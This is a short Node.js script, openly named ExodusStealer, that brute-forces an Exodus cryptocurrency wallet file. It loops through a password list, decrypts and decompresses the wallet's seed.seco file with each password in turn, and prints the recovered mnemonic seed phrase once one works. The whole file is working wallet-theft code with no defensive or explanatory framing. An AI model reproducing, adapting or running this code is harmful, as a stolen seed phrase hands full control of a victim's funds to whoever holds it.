const seco = require("seco-file");
const zlib = require("zlib");
const bs = require("bitcoin-seed");
const fs = require("fs");
const path = require("path");

function shrink(e) {
    const t = e.readUInt32BE(0);
    return e.slice(4, t + 4);
}

function decrypt(secoPath, password) {
    try {
        let decrypted = seco.decryptData(fs.readFileSync(secoPath), password).data;
        let shrinked = shrink(decrypted);
        let gunzipped = zlib.gunzipSync(shrinked);
        let mnemonic = bs.fromBuffer(gunzipped).mnemonicString;
        return mnemonic;
    } catch (err) {
        return null;
    }
}

const secoFilePath = path.join(__dirname, "seed.seco");

function ExodusStealer() {
    const passwords = fs.readFileSync(path.join(__dirname, "passwords.txt"), "utf-8").split("\n");
    for (let password of passwords) {
        password = password.trim();
        if (password.length > 0) {
            let decryptedMnemonic = decrypt(secoFilePath, password);
            if (decryptedMnemonic) {
                return { "mnemonic": decryptedMnemonic };
            }
        }
    }
    return { "error": "No matching password found.", "success": false };
}

var result = ExodusStealer();
console.log(result);
